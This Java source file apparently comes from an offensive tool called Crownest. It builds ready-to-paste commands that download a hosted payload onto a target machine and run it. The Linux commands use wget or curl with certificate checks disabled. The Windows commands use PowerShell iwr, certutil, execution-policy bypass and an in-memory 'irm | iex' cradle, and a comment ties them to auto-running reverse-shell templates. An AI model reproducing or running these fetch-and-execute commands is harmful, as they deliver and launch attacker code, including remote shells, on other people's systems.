package com.crownest.payload;

/**
 * Builds a copy-paste "download and execute" command for a hosted payload,
 * tailored to the target OS and the payload's file type.
 *
 * Linux drops into /tmp, Windows into %TEMP%. The interpreter or run step is
 * chosen from the file extension, matching how each script is actually run
 * (python3, perl, ruby, node, bash, chmod+run for binaries, and so on).
 */
public final class ExecSuggestion {

    public enum Os { LINUX, WINDOWS }

    private ExecSuggestion() {
    }

    /**
     * @param os       target operating system
     * @param url      the Crownest URL the file is served at
     * @param fileName the hosted file name (its extension drives the run step)
     * @param tls      whether the URL is HTTPS with a self-signed certificate
     */
    public static String build(Os os, String url, String fileName, boolean tls) {
        String ext = extensionOf(fileName);
        return os == Os.WINDOWS
                ? windows(url, fileName, ext, tls)
                : linux(url, fileName, ext, tls);
    }

    // ------------------------------------------------------------------- Linux

    private static String linux(String url, String fileName, String ext, boolean tls) {
        String tmp = "/tmp/" + fileName;
        String noCheck = tls ? " --no-check-certificate" : "";
        String get = "wget" + noCheck + " " + url + " -O " + tmp;
        String curlNoCheck = tls ? " -k" : "";
        String getCurl = "curl" + curlNoCheck + " -s " + url + " -o " + tmp;

        String run = switch (ext) {
            case "py"  -> "python3 " + tmp;
            case "pl"  -> "perl " + tmp;
            case "rb"  -> "ruby " + tmp;
            case "php" -> "php " + tmp;
            case "lua" -> "lua " + tmp;
            case "js"  -> "node " + tmp;
            case "go"  -> "go run " + tmp;
            case "v"   -> "v run " + tmp;
            case "hs"  -> "runghc " + tmp;
            case "dart" -> "dart run " + tmp;
            case "cr"  -> "crystal run " + tmp;
            case "cs"  -> "mcs " + tmp + " && mono " + swapExt(tmp, "exe");
            case "c"   -> "gcc " + tmp + " -o /tmp/rev && /tmp/rev";
            case "java" -> "javac " + tmp + " && java -cp /tmp " + baseNoExt(fileName);
            case "elf", "bin", "" -> "chmod +x " + tmp + " && " + tmp;
            default    -> "bash " + tmp;     // sh and everything shell-shaped
        };

        StringBuilder sb = new StringBuilder();
        sb.append("# download then run\n");
        sb.append(get).append("; ").append(run).append("\n\n");
        sb.append("# curl variant\n");
        sb.append(getCurl).append("; ").append(run);
        return sb.toString();
    }

    // ----------------------------------------------------------------- Windows

    private static String windows(String url, String fileName, String ext, boolean tls) {
        String tmp = "$env:TEMP\\" + fileName;      // PowerShell
        String cmdTmp = "%TEMP%\\" + fileName;       // cmd.exe
        String skip = tls ? " -SkipCertificateCheck" : "";

        // PowerShell download for every type.
        String iwr = "iwr " + url + skip + " -OutFile " + tmp;
        // certutil alternative (cmd.exe), no TLS-skip option.
        String certutil = "certutil -urlcache -f -split " + url + " " + cmdTmp;

        String runPs;
        String runCmd;
        switch (ext) {
            case "ps1" -> {
                runPs = ". " + tmp;                           // dot-source
                runCmd = "powershell -ep bypass -f " + cmdTmp;
            }
            case "exe", "bat" -> {
                runPs = "& " + tmp;
                runCmd = cmdTmp;
            }
            case "js" -> {
                runPs = "cscript //nologo " + tmp;
                runCmd = "cscript //nologo " + cmdTmp;
            }
            case "py" -> {
                runPs = "python " + tmp;
                runCmd = "python " + cmdTmp;
            }
            case "php" -> {
                runPs = "php " + tmp;
                runCmd = "php " + cmdTmp;
            }
            case "pl" -> {
                runPs = "perl " + tmp;
                runCmd = "perl " + cmdTmp;
            }
            case "rb" -> {
                runPs = "ruby " + tmp;
                runCmd = "ruby " + cmdTmp;
            }
            default -> {
                runPs = "& " + tmp;
                runCmd = cmdTmp;
            }
        }

        StringBuilder sb = new StringBuilder();
        if ("ps1".equals(ext)) {
            // Shortest path for a PS script: a one-line in-memory cradle, no
            // file on disk. irm returns the raw body, so it pipes straight into
            // iex; the reverse-shell templates auto-execute once loaded.
            sb.append("# PowerShell in-memory (no file on disk)\n");
            sb.append("irm ").append(url).append(skip).append(" | iex").append("\n\n");
        }
        sb.append("# PowerShell: download then run\n");
        sb.append(iwr).append("; ").append(runPs).append("\n\n");
        sb.append("# cmd.exe: download then run\n");
        sb.append(certutil).append(" & ").append(runCmd);
        return sb.toString();
    }

    // --------------------------------------------------------------- helpers

    static String extensionOf(String fileName) {
        int dot = fileName.lastIndexOf('.');
        return dot < 0 ? "" : fileName.substring(dot + 1).toLowerCase();
    }

    private static String baseNoExt(String fileName) {
        int dot = fileName.lastIndexOf('.');
        return dot < 0 ? fileName : fileName.substring(0, dot);
    }

    private static String swapExt(String path, String newExt) {
        int dot = path.lastIndexOf('.');
        return (dot < 0 ? path : path.substring(0, dot)) + "." + newExt;
    }
}
